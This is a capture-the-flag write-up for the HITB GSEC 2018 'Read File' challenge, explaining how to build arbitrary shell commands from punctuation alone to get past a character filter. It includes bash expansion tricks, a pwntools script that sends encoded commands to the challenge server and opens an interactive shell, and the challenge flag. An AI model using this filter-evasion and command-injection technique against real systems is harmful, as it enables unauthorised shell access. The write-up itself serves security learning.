---
title: "HITB GSEC Qualifiers 2018 - Read File (Misc)"
header:
  overlay_image: /assets/images/hitbgsecquals2018/readfile/header.jpg
  overlay_filter: 0.5
  caption: "Photo credit: Christopher Burns on Unsplash"
tags:
  - hitbgsecquals2018
  - writeup
  - misc
---

Arbitrary shell commands can be created by using only punctuation in a service
that filters all characters except for punctuation.

## Challenge Description

```
nc 47.75.148.60 9999


nc 47.75.148.60 9999
```

#### Points

266 Points

56 Solved

## Solution

The service filters all characters except punctuation before running:

```
echo $input
```

Thus, the objective is to figure out a way to create letters from only
punctuation characters.

We can make numbers with the following primitive (1):

```
$(( $$/$$ ))
```

Next, we can get the string "runsh" in:

```
${!#}
```

Now, we can extract letters from the string by using subscripts.

The solution script by Quanyang:

```python
from pwn import *
context(arch = 'i386', os = 'linux')

r = remote('47.75.148.60', 9999)
# EXPLOIT CODE GOES HERE
print r.recvuntil("Input:")
_1 = "$(( $$/$$ ))"
_2 = "$(( ($$/$$)+($$/$$) ))"
_3 = "$(( ($$/$$)+($$/$$)+($$/$$) ))"
_4 = "$(( ($$/$$)+($$/$$)+($$/$$)+($$/$$) ))"
_5 = "$(( ($$/$$)+($$/$$)+($$/$$)+($$/$$)+($$/$$) ))"
_6 = "$(( ($$/$$)+($$/$$)+($$/$$)+($$/$$)+($$/$$)+($$/$$) ))"
_7 = "$(( ($$/$$)+($$/$$)+($$/$$)+($$/$$)+($$/$$)+($$/$$)+($$/$$) ))"
_8 = "$(( ($$/$$)+($$/$$)+($$/$$)+($$/$$) +($$/$$)+($$/$$)+($$/$$)+($$/$$)))"
_9 = "$(( ($$/$$)+($$/$$)+($$/$$)+($$/$$)+($$/$$)+($$/$$)+($$/$$)+($$/$$)+($$/$$) ))"
_0 = "${#}"
chars = {"r":"${!#:2:1}","u":"${!#:3:1}","n":"${!#:4:1}","s":"${!#:6:1}",
         "h":"${!#:7:1}","B":"${-:1}"}

def format(cmd):
    for i in cmd:
        if i in chars:
            cmd = cmd.replace(i,chars[i])
    cmd = cmd.replace("1",_1).replace("2",_2).replace("3",_3).replace("4",_4)
    cmd = cmd.replace("5",_5).replace("6",_6).replace("7",_7).replace("8",_8)
    cmd = cmd.replace("9",_9).replace("0",_0)
    return cmd
cmd = raw_input()
r.sendline(format(cmd))
r.interactive()
```

Running the above script and executing `sh` will give us a shell to find the
flag.

Flag: **HITB{d7dc2f3c59291946abc768d74367ec31}**
